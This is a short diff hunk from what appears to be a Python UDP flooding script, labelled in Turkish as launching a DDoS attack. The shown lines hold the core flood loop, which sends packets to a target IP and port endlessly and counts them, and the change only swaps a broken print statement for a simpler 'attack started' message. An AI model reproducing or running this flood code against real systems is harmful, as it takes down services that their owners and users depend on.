@@ -21,4 +21,4 @@ sayac=0
 while True:
         sock.sendto(bytes,(ip,port))
         sayac=sayac+1
-        print("DDoS Attack Başlatıldı! Gönderilen Paket:%s"((sayac)
+        print("DDoS Attack Başlatıldı!")
